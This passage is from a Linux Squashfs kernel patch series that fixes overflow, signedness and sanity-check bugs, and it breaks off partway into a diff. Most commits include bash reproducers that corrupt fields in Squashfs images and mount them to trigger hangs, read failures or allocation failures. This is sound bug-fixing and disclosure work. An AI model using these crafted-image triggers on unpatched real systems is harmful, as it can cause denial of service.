Subject: Squashfs: widen xattr count variables and add sanity check
Date: Mon, 23 Nov 2026 03:42:54 +0000

The maximum number of Xattrs in an inode is 2^32-1 in Squashfs.  However
the code incorrectly treats the count as signed, or 2^31-1.

This means any value above 2^31-1 becomes a negative number, and it
means loops will not terminate due to the negative comparison.  This
means the code will continue reading the filesystem until either the
data is incorrect, or the end of the filesystem is reached.

The code also lacks a check that the count is too large, which will
again mean that the code will continue reading the filesystem.

Finally, the code also lacks a check for a zero count, this means
anything reading xattrs from the inode will successfully read no xattrs,
even though this should have returned error due to corruption.

This commit changes the variables to be unsigned, and so negative values
do not occur, and it first adds a sanity check for a zero xattr count,
and second checks that the count isn't larger than the xattr size.

Reproducer
==========

This reproducer allows both zero, negative and large xattr count to be
reproduced.  In the case of a negative or large count, the exploit
succeeds if dmesg shows the code failed to read a metadata block, due to
the loop not terminating.  In the case of a zero count, the exploit
succeeds if gerfattr successfully returns with no xattrs.

====================================================================
#!/bin/bash

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

if [ $# -lt 1 ]; then
	echo This needs a parameter
	echo $0 N/0/L 
	echo N reproduce negative xattr count
	echo 0 reproduce 0 xattr count
	echo L reproduce a large count
	exit 1
fi

if [ $1 = "N" ]; then
	echo Reproducing negative xattr count
elif [ $1 = "0" ]; then
	echo Reproducing 0 xattr count
elif [ $1 = "L" ]; then
	echo Reproducing large xattr count
else
	echo Input not N, 0 or L
	exit 1
fi

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

echo "/ d 0777 0 0" > pseudo
echo "example f 0777 0 0 echo example data" >> pseudo
echo "example x user.comment=example xattr" >> pseudo

# Generate the Squashfs filesystem
echo Generate the Squashfs filesystem

mksquashfs - img.sqsh -pf pseudo -quiet -no-progress -noX

# The xattr_id_table_start is at offset 56 in the superblock, 32-bit little-endian.
# For such a small filesystem, we only need to read the first two bytes.
low=$(dd if=img.sqsh bs=1 skip=56 count=1 status=none | od -An -v -tu1 | tr -d '\n')
hi=$(dd if=img.sqsh bs=1 skip=57 count=1 status=none | od -An -v -tu1 | tr -d '\n')
start=$(( $hi * 256 + $low ))

# The start of the single xattr id is 16 bytes before the xattr_id_table, and the
# count field is 8 bytes before
(( start -= 8 ))

if [ $1 = "N" ]; then
	# Write -1 to the count field
	echo Writing -1 to the count field
	echo -ne "\xff\xff\xff\xff" > file
elif [ $1 = "0" ]; then
	# Write 0 to the count field
	echo Writing 0 to the count field
	echo -ne "\x00\x00\x00\x00" > file
else
	# Write 255 to the count field
	echo Writing 255 to the count field
	echo -ne "\xff\x00\x00\x00" > file
fi

dd if=file of=img.sqsh bs=1 seek=$start count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

if [ $1 = "0" ]; then
	if ! getfattr /mnt/example > output; then
		echo Exploit failed, getfattr returned error
	elif [ ! -s output ]; then
		echo Exploit succeeded, getfattr returned success with no xattrs
	else
		echo Getfattr succeeded with some xattrs.  The filesystem was not corrupted
	fi
else
	if ! getfattr /mnt/example; then
		echo Getfattr failed, this is expected.
		echo If dmesg shows the following, then the exploit succeeded
		echo SQUASHFS error: Failed to read block 0x124: -5
		echo SQUASHFS error: Unable to read metadata cache entry [122]
	else
		echo Getfattr succeeded with some xattrs.  The filesystem was not corrupted
	fi
fi

popd 2>&1 > /dev/null
rm -rf $DIR
exit 0
====================================================================

Link: https://patch.msgid.link/20261123034304.261742-14-phillip@squashfs.org.uk
Fixes: f41d207cbede ("squashfs: add support for xattr reading")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: very large files can exceed an int or size_t
Date: Mon, 23 Nov 2026 03:42:55 +0000

Squashfs in many places uses a signed int to store the block number and
block count of a file.  If the block size is using the Linux page size
(normally 4 KiB), it means any file larger than 8 TiB (2^43) will
overflow a signed int.

If the block number and block count is in terms of the Squashfs
filesystem block size (which can be between 4 kiB and 1 MiB), it
depends on the block size as to when a signed int will overflow, but a
file larger than 256 TiB (2^48) using 128 KiB blocks will overflow a
signed int.

Additionally on 32-bit architectures, size_t is defined as an unsigned
int, and where variables are being used as a block count (len) or mask,
these can overflow on very large files too.

This commit widens all appropriate variables to avoid overflow.

Reproducer
==========

The following reproducer creates a Squashfs filesystem with a 8 TiB +
4096 byte sparse file.  The filestem is mounted, and the last 4096
bytes are read from the file.  If the reproducer is successful the
process will hang.  This is because signed int overflow occurs in
squashfs_copy_cache() with the result that folio_end_read() is
not called.

====================================================================
#!/bin/bash

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo "Create an 8 Tib (2^43) + 4096 byte sparse file"

if ! truncate --size 8796093026304 bigfile; then
	echo Create of sparse file failed.
	finish
fi	

echo Generate the Squashfs filesystem containing the sparse file
echo This will be VERY slow on Squashfs-tools older than 4.7.3

mksquashfs bigfile bigfile.sqsh -b 1M -quiet

echo Mount the filesystem to /mnt

if ! mount -t squashfs bigfile.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo Read the last 4096 bytes from the sparse file.
echo If the exploit succeeds the process will hang

dd if=/mnt/bigfile bs=1 skip=8796093022208

popd 2>&1 > /dev/null
rm -rf $DIR
exit 0
====================================================================

Link: https://patch.msgid.link/20261123034304.261742-15-phillip@squashfs.org.uk
Fixes: 1701aecb6849 ("Squashfs: regular file operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: add more sanity checking to squashfs_block_size()
Date: Mon, 23 Nov 2026 03:42:56 +0000

Squashfs_block_size() sanity checks the data and fragment block size
read from disk.  However, it doesn't do all the sanity checking that
it could do.  This means detectably invalid block sizes are passed
down to squashfs_read_data().

This situation is sub-optimal because in the case of fragment
blocks, a fragment cache buffer has to obtained (with possible
waits for a free buffer etc.) before squashfs_read_data() is called.

In both fragment and data block cases if the buffer is compressed, it
means a free decompressor may be obtained (with possible waits for a
decompressor) by squashfs_read_data(), only to have the decompression
fail.

In both these cases this adds unnecessary overhead which may impact
performance, and this is with values that should have been detected
earlier.

This commit adds extra sanity checking to trap additional incorrect
values.

Reproducer
==========

The reproducer generates a Squashfs filesystem and then corrupts the
block size value for file zero block 0.  If the exploit succeeds this
corrupted value is not detected, and it is passed to the decompressor
via squashfs_read_data() which then fails at that point.

====================================================================
#!/bin/bash

ARGS="-quiet -no-progress -no-fragments -noI -noD -no-sparse -comp gzip"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create Squashfs filesystem with one file

echo "/ d 0777 0 0" > pseudo
echo "zero f 0777 0 0 dd if=/dev/zero bs=1024 count=128 2>/dev/null" >> pseudo

if ! mksquashfs - img.sqsh -pf pseudo $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

echo Corrupt the data block size for block 0 in file zero
echo Flip the compression bit from uncompressed to compressed.
echo "This is at byte offset 131207 (96 + 128 KiB + 37)"

dd if=/dev/zero of=img.sqsh seek=131205 bs=1 count=1 conv=notrunc status=none

echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo Read the file zero.
echo If the exploit succeeds, dmesg should show the following:
echo "SQUASHFS error: zlib decompression failed, data probably corrupt"
echo "SQUASHFS error: Failed to read block 0x60: -5"
echo "SQUASHFS error: zlib decompression failed, data probably corrupt"
echo "SQUASHFS error: Failed to read block 0x60: -5"
echo "SQUASHFS error: Unable to read data cache entry [60]"
echo "SQUASHFS error: Unable to read page, block 60, size 20000"

dd if=/mnt/zero

popd 2>&1> /dev/null

rm -rf $DIR
==============================================================================

Link: https://patch.msgid.link/20261123034304.261742-16-phillip@squashfs.org.uk
Fixes: 1701aecb6849 ("Squashfs: regular file operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: sanity check fragment block location and range
Date: Mon, 23 Nov 2026 03:42:57 +0000

When reading fragment blocks from disk the location and range of the
fragment block is not sanity checked before it is passed down to
squashfs_read_data().

In squashfs_read_data() the block location and range are sanity checked
to the extent that the location plus block length does not go beyond the
end of the filesystem.  But, a block location can be crafted to be close
to 2^64, and so the addition of the location and the length can cause
arthimetic overflow, and thereby evade the sanity check.

This evasion, however, will be caught when the code after the sanity
check tries to read the block from the filesystem.  This is because
it is the block location that is passed to the I/O read, and not
the result of the overflowed sanity check.  This will return error
because it will be beyond the end of the device.

The real issue here is that leaving the sanity checking of the fragment
block location and range to squashfs_read_data() is sub-optimal.  This
is because a fragment cache buffer has to be obtained (with possible
waits fop a free buffer, and then the eviction of the original cached
contents) before squashfs_read_data() is called.

This adds unnecessary overhead and contention, which could be exploited
to reduce performance, and this is for incorrect values that should have
been detected earlier.

This commit adds extra sanity checking to ensure the fragment block
location and range are within bounds before a free fragment block is
obtained.

Reproducer
==========

The reproducer generates a Squashfs filesytem with a fragment block, and
then corrupts the location of the fragment block to 2^64 - 32 KiB.  If
the exploit succeeds this corrupted value is paased to
squaashfs_read_data() and it is not detected until the I/O read fails.

=====================================================================
#!/bin/bash

ARGS="-quiet -no-progress -noI -noD -noF -no-sparse -comp gzip"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create Squashfs filesystem with one file

echo "/ d 0777 0 0" > pseudo
echo "zero f 0777 0 0 dd if=/dev/zero bs=1024 count=32 2>/dev/null" >> pseudo

if ! mksquashfs - img.sqsh -pf pseudo $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

echo "Corrupt the location of fragment block 0"
echo "Alter it to the value 0xFFFFFFFFFFFF8000 (2^64 - 32 KiB)"
echo "The block location is stored at byte offset 32958"

/usr/bin/echo -en "\x00\x80\xff\xff\xff\xff\xff\xff" > file
dd if=file of=img.sqsh seek=32958 bs=1 count=8 conv=notrunc status=none

echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo Read the file zero.
echo If the exploit succeeds, dmesg should show the following:
echo "dd: attempt to access beyond end of device"
echo "	loop20: rw=2048, sector=36028797018963904, nr_sectors = 64 limit=72"
echo "SQUASHFS error: Failed to read block 0xffffffffffff8000: -5"
echo "SQUASHFS error: Unable to read fragment cache entry [ffffffffffff8000]"
echo "SQUASHFS error: Unable to read fragment cache entry [ffffffffffff8000]"
echo "SQUASHFS error: Unable to read page, block ffffffffffff8000, size 1008000"

dd if=/mnt/zero

popd 2>&1> /dev/null

rm -rf $DIR
=========================================================================

Link: https://patch.msgid.link/20261123034304.261742-17-phillip@squashfs.org.uk
Fixes: f400e12656ab ("Squashfs: cache operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: sanity check block list sizes and range
Date: Mon, 23 Nov 2026 03:42:58 +0000

A Squashfs file has a list of block sizes, storing the compressed size
of each data block.  This block list is scanned to discover the size and
location of block x, where the sizes of previous data blocks are added
to the start of the data blocks to produce the location.

But, when scanning this block list and adding the block sizes, the code
does not check for arithmetic overflow.  This means the data block start
location can be crafted to be close to 2^64, and so the addition of the
block sizes can cause arithmetic overflow and thereby evade any sanity
checks.

Additionally, the range (start and end) of the data block that is to be
read from the filesystem is not checked for correctness before
squasfs_read_data().

This commit adds checks for arithmetic overflow and sanity checks the
range of the data block before attempting to read from disk.

Reproducer
==========

The reproducer generates a Squashfs filesystem with a file with two
data blocks, and then corrupts the location of the start of the data
blocks to 2^64 - 128 KiB.  This added to the size of data block 0 (128
KiB) will overflow, producing a location of 0.  If the exploit succeeds,
when the second block is read, Squashfs will not produce an I/O error
and instead print the Squashfs filesystem superblock starting with hsqs.

====================================================================
#!/bin/bash

ARGS="-quiet -no-progress -noI -noD -no-sparse -no-fragments -comp gzip"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo "Create Squashfs filesystem with one file, with 2 data blocks"
echo "Create a hard link to it, to force Mksquashfs to use an extended inode"
echo "(more than one nlink).  This means the start_block field will"
echo "be 64-bits"

echo "/ d 0777 0 0" > pseudo
echo "zero f 0777 0 0 dd if=/dev/zero bs=1024 count=256 2>/dev/null" >> pseudo
echo "hardlink L zero" >> pseudo

if ! mksquashfs - img.sqsh -pf pseudo $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

echo "Corrupt the start_block field of file zero's inode, which"
echo "points to the start of the file's data blocks."
echo "Alter it to the value 0xFFFFFFFFFFFE0000 (2^64 - 128 KiB)."
echo "That value added to the size of the first data block (128 KiB)"
echo "will overflow"
echo "The inode start_block field is stored at byte offset 262258"

/usr/bin/echo -en "\x00\x00\xfe\xff\xff\xff\xff\xff" > file
dd if=file of=img.sqsh seek=262258 bs=1 count=8 conv=notrunc status=none

echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo Read the file zero.
echo If the exploit succeeds, dd will not fail, and it will display the Squashfs
echo superblock, beginning with hsqs
echo

dd if=/mnt/zero bs=1024 skip=128

popd 2>&1> /dev/null

rm -rf $DIR
====================================================================

Link: https://patch.msgid.link/20261123034304.261742-18-phillip@squashfs.org.uk
Fixes: 1701aecb6849 ("Squashfs: regular file operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: don't store large export table indexes in memory
Date: Mon, 23 Nov 2026 03:42:59 +0000

When mounting a Squashfs filesystem, the code reads the entire
export table indexes into memory.  Their size is determined by the
number of inodes in the filesystem.  For the maximum inode
count of 2^32, this will allocate and read 32 MiB.

This is an excessive and unnecessary amount of memory because the
indexes do not need to be read into memory in their entirety.  In
addition kmalloc() is used to allocate memory, and this can fail when
large amounts of memory are requested.  Kmalloc() on modern kernels is
usually limited to 4096 KiB.  If panic-on-warn is set, then failure to
allocate memory will result in a kernel panic.

This commit uses a 4 page cache if the size of the export table indexes
are 4 pages in size or larger.  A simple and fast lookup array is
retained where the total index size is less than 4 pages in size, which
is the vast majority of Squashfs filesystems.

Reproducer
==========

The following reproducer will create a Squashfs filesystem with
540,540,568 inodes (540 million files).  This will cause the export
table indexes to exceed 4096 KiB, and the kmalloc() should fail when the
filesystem is mounted.  Due to the large amount of inodes the Squashfs
filesystem reproducer needs to be run on a 64-bit machine with around
60 GiB of memory (or swap).

The latest development Mksquashfs from the GitHub Squashfs-tools
repository also needs to be used.

=====================================================================
#!/bin/bash

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

IMG=$PWD/reproducer.sqsh
DIR=$(mktemp -d)

if [ -e $IMG ]; then
	rm $IMG
fi

pushd $DIR 2>&1 > /dev/null

# create 20 million pseudo file links to empty file
touch a
a=0
while [ $a -le 19 ]; do
	b=0
	while [ $b -le 999 ]; do
		c=0
		while [ $c -le 999 ]; do
			echo "x/$a/$b/$c l a" >> file
			(( c ++ ))
		done
		(( b ++ ))
	done
	(( a ++ ))
done

for i in $(seq 1 27); do
	sed "s/x/$i/g" file > pseudo
	echo
	echo Iteration $i - appending 20 million files to Squashfs filesystem
	echo
	if ! mksquashfs - $IMG -pf pseudo -no-hardlinks -pd "d 0777 0 0" -no-recovery -no-progress -comp lz4; then
		echo Appending to Squashfs filesystem failed
		finish
	fi
done

popd 2>&1 > /dev/null
rm -rf $DIR

echo Generated Squashfs filesystem $IMG
=====================================================================

Link: https://patch.msgid.link/20261123034304.261742-19-phillip@squashfs.org.uk
Fixes: 122601408d20 ("Squashfs: export operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: don't store large fragment table indexes in memory
Date: Mon, 23 Nov 2026 03:43:00 +0000

When mounting a Squashfs filesystem, the code reads the entire fragment
table indexes into memory.  Their size is determined by the number of
fragments in the filesystem, where the maximum number of fragments is
2^32, and this will allocate and read 64 MiB.

This is an execessive and unnecessary amount of memory because the
indexes do not need to be read into memory in their entirety.  In
addition kmalloc() is used to allocate memory, and this can fail when
large amounts of memory are requested.  Kmalloc() on modern kernels is
usually limited to 4096 KiB. If panic-on-warn is set, then failure to
allocate memory willl result in a kernel panic.

This commit uses a 4 page cache if the size of the fragment table
indexes are 4 pages or larger.  A simple and fast lookup array is
retained where the total index size is less than 4 pages in size, which
is the vast majority of Squashfs filesystems.

Reproducer
==========

The following reproducer will create a Squashfs filesystem with
280 million fragments, which will cause the fragment table indexes to
exceed 4096 KiB, and the kmalloc() should fail when the filesystem is
mounted.

=====================================================================
#!/bin/bash

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

IMG=$PWD/reproducer.sqsh
DIR=$(mktemp -d)

if [ -e $IMG ]; then
	rm $IMG
fi

pushd $DIR 2>&1 > /dev/null

# create 20 million pseudo file links to file 2049 bytes in size
truncate -s 2049 a
a=0
while [ $a -le 19 ]; do
	b=0
	while [ $b -le 999 ]; do
		c=0
		while [ $c -le 999 ]; do
			echo "x/$a/$b/$c l a" >> file
			(( c ++ ))
		done
		(( b ++ ))
	done
	(( a ++ ))
done

for i in $(seq 1 14); do
	sed "s/x/$i/g" file > pseudo
	echo
	echo Iteration $i - appending 20 million files to Squashfs filesystem
	echo
	if ! mksquashfs - $IMG -pf pseudo -mem 100m -no-hardlinks -no-sparse -no-duplicates -no-exports -pd "d 0777 0 0" -no-recovery -b 4096; then
		echo Appending to Squashfs filesystem failed
		finish
	fi
done

popd 2>&1 > /dev/null
rm -rf $DIR

echo Generated Squashfs filesystem $IMG
=====================================================================

Link: https://patch.msgid.link/20261123034304.261742-20-phillip@squashfs.org.uk
Fixes: 122edd1514aa ("Squashfs: fragment block operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: don't store large xattr id table indexes in memory
Date: Mon, 23 Nov 2026 03:43:01 +0000

When mounting a Squashfs filesystem, the code reads the entire xattr id
table indexes into memory.  Their size is determined by the number of
xattr ids in the filesystem, where the maximum number of xattr ids is
2^32, and this will allocate and read 64 MiB.

This is an excessive and unnecessary amount of memory because the
indexes do not need to be read into memory in their entirety.  In
addition kmalloc() is used to allocate memory, and this can fail when
large amounts of memory are requested.  Kmalloc() on modern kernels is
usually limited to 4096 KiB.  If panic-on-warn is set, then failure to
allocate memory will result in a kernel panic.

This commit uses a 4 page cache if the size of the xattr id table
indexes are 4 pages or larger.  A simple and fast lookup array is
retained where the total index size is less than 4 pages in size, which
is the vast majority of Squashfs filesystems.

Reproducer
==========

The following reproducer will create a Squashfs filesystem with
280 million xattr ids, which will cause the xattr id table indexes to
exceed 4096 KiB, and the kmalloc() should fail when the filesystem is
mounted.

=====================================================================
#!/bin/bash

ARGS="-pf pseudo -mem 100m -no-hardlinks -no-sparse -no-duplicates "
ARGS+="-no-exports -no-recovery -no-progress -no-xattr-dups"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

IMG=$PWD/reproducer.sqsh
DIR=$(mktemp -d)

if [ -e $IMG ]; then
	rm $IMG
fi

pushd $DIR 2>&1 > /dev/null

# create 20 million pseudo file links to empty file
touch a
a=0
while [ $a -le 19 ]; do
	b=0
	while [ $b -le 999 ]; do
		c=0
		while [ $c -le 999 ]; do
			echo "X/$a/$b/$c l a" >> file
			echo "X/$a/$b/$c x user.x=1" >> file
			(( c ++ ))
		done
		(( b ++ ))
	done
	(( a ++ ))
done

for i in $(seq 1 14); do
	sed "s/X/$i/g" file > pseudo
	echo
	echo Iteration $i - appending 20 million files to Squashfs filesystem
	echo
	if ! mksquashfs - $IMG -pd "d 0777 0 0" $ARGS; then
		echo Appending to Squashfs filesystem failed
		finish
	fi
done

popd 2>&1 > /dev/null
rm -rf $DIR

echo Generated Squashfs filesystem $IMG
=====================================================================

Link: https://patch.msgid.link/20261123034304.261742-21-phillip@squashfs.org.uk
Fixes: 4b5397dc24ab ("squashfs: add xattr id support")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: fix variables in directory code and add more sanity checks
Date: Mon, 23 Nov 2026 03:43:02 +0000

A directory larger than a metadata block (8192 bytes) will have a
directory index to allow faster reading and lookup of names.  This
index allows the code to jump to the desired compressed metadata block,
without requiring the directory to be scanned from the beginning.

But the index handling code has a defect in that multiple variables
including those used to read and track directory indexes from disk are
signed ints.  This means any index which is 2^31 or larger will be
treated as a negative value.  The knock on efect of this is that the
offset into the desired metadata block is incorrectly computed, with the
result the directory fails to be read, and an I/O error is returned.

This commit corrects the variables (and function return value) to be
unsigned int, and it also adds more sanity checking of the values read
off disk (including directory size to avoid underflow in subtraction).
Now if a directory index is found to be incorrect, the index is
discarded and the previous index read from disk is used.  This allows
the directory to be read correctly without throwing an I/O error.

Reproducer
==========

The following reproducer creates a Squashfs filesystem with a root
directory which has a directory index.  The reproducer then corrupts
root directory index 0 with an index value of -1.  The filesystem is
then mounted, and stat run on file /mnt/filename-490.

If the exploit succeeds stat will report an I/O error and dmesg will
contain Squashfs error reports.

=====================================================================
#!/bin/bash

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

for i in $(seq 1 1000); do
	echo "filename-$i f 0700 0 0 echo hello" >> pseudo
done

echo "Create a Squashfs filesystem"
if ! mksquashfs - img.sqsh -pf pseudo -pd "d 0777 0 0" -noI -no-progress -quiet; then
	echo Creating the Squashfs filesystem failed
	finish
fi

# Write -1 in little-endian format to file
/usr/bin/echo -en "\xff\xff\xff\xff" > file

echo "Over-write the root directory index 0, with an index value of -1."
echo "This because the metadata is uncompressed can be over-written directly,"
echo "but, normally the metadata will be compressed."
echo "The location of the 4 byte index is 32150"

dd bs=1 seek=32150 if=file of=img.sqsh count=4 conv=notrunc status=none

echo
echo "Mount the filesystem on /mnt"

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo
echo "Run stat /mnt/filename-490 on the mounted filesystem"
echo
echo "If the exploit works stat will report I/O error, and dmesg will"
echo "contain Squashfs error reports"
echo

stat /mnt/filename-490
umount /mnt
popd 2>&1 > /dev/null

rm -rf $DIR
exit 0
=====================================================================

Link: https://patch.msgid.link/20261123034304.261742-22-phillip@squashfs.org.uk
Fixes: 07972dde75c3 ("Squashfs: directory readdir operations")
Fixes: c88da2c97936 ("Squashfs: directory lookup operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: fix regression in squashfs_copy_cache()
Date: Mon, 23 Nov 2026 03:43:03 +0000

In a recent commit updating the code to use folios, the bytes variable
was changed from signed to unsigned in squashfs_copy_cache().

The bytes variable is used in a loop where PAGE_SIZE bytes are
subtracted from it each time around the loop, and where the loop
terminates once bytes is less than or equal to zero.

The effect of the change in signedness is bytes no longer becomes
negative when it is not a multiple of PAGE_SIZE, and the loop does not
terminate when it should do, and instead folios are created and filled
after file EOF.

These beyond EOF folios are not visible to user-space and hence this is
a silent regression.

This commit fixes the code to only subtract the minimum of bytes or
PAGE_SIZE, and which ensures the variable does not underflow.

Link: https://patch.msgid.link/20261123034304.261742-23-phillip@squashfs.org.uk
Fixes: 5641371fd0b3 ("squashfs; convert squashfs_copy_cache() to take a folio")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
Subject: Squashfs: check index isn't greater than S64_MAX in squashfs_read_data()
Date: Mon, 23 Nov 2026 03:43:04 +0000

The previous commits in this patch-set now sanity check index before
squashfs_read_data() is called.  However, it is always wise to take
a belts and braces approach and sanity check at the lowest level to
trap any values that could slip through.

Link: https://patch.msgid.link/20261123034304.261742-24-phillip@squashfs.org.uk
Fixes: e2780ab159ac ("Squashfs: block operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>

 fs/squashfs/block.c            |   20 +
 fs/squashfs/cache.c            |    8 
 fs/squashfs/dir.c              |  114 +++++++--
 fs/squashfs/export.c           |  146 ++++++++----
 fs/squashfs/file.c             |   93 +++++--
 fs/squashfs/fragment.c         |  113 +++++++--
 fs/squashfs/id.c               |    9 
 fs/squashfs/inode.c            |   77 ++++--
 fs/squashfs/namei.c            |  137 ++++++++---
 fs/squashfs/squashfs.h         |    9 
 fs/squashfs/squashfs_fs.h      |  101 --------
 fs/squashfs/squashfs_fs_i.h    |    2 
 fs/squashfs/squashfs_fs_sb.h   |   25 +-
 fs/squashfs/squashfs_helpers.h |  362 +++++++++++++++++++++++++++++++
 fs/squashfs/super.c            |   96 +++++---
 fs/squashfs/xattr.c            |   49 ++--
 fs/squashfs/xattr.h            |   21 +
 fs/squashfs/xattr_id.c         |  171 ++++++++++----
 18 files changed, 1132 insertions(+), 421 deletions(-)

--- a/fs/squashfs/block.c~a
+++ a/fs/squashfs/block.c
@@ -23,6 +23,7 @@
 
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "decompressor.h"
 #include "page_actor.h"
@@ -292,16 +293,25 @@ int squashfs_read_data(struct super_bloc
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
 	struct bio *bio = NULL;
-	int compressed;
+	bool compressed;
 	int res;
 	int offset;
 
+	/*
+	 * Reject index values greater than possible filesystem size (S64_MAX).
+	 * This also ensures the index variable doesn't overflow in the function.
+	 */
+	if (index > S64_MAX) {
+		res = -EIO;
+		goto out;
+	}
+
 	if (length) {
 		/*
 		 * Datablock.
 		 */
-		compressed = SQUASHFS_COMPRESSED_BLOCK(length);
-		length = SQUASHFS_COMPRESSED_SIZE_BLOCK(length);
+		compressed = squashfs_compressed_block(length);
+		length = squashfs_compressed_size_block(length);
 		TRACE("Block @ 0x%llx, %scompressed size %d, src size %d\n",
 			index, compressed ? "" : "un", length, output->length);
 	} else {
@@ -341,8 +351,8 @@ int squashfs_read_data(struct super_bloc
 		bio_uninit(bio);
 		kfree(bio);
 
-		compressed = SQUASHFS_COMPRESSED(length);
-		length = SQUASHFS_COMPRESSED_SIZE(length);
+		compressed = squashfs_compressed(length);
+		length = squashfs_compressed_size(length);
 		index += 2;
 
 		TRACE("Block @ 0x%llx, %scompressed size %d\n", index - 2,
--- a/fs/squashfs/cache.c~a
+++ a/fs/squashfs/cache.c
@@ -42,6 +42,7 @@
 
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "page_actor.h"
 
@@ -489,9 +490,12 @@ struct squashfs_cache_entry *squashfs_ge
 				u64 start_block, int length)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	int res = squashfs_check_range(start_block, squashfs_frag_size(length, msblk->block_size), msblk);
 
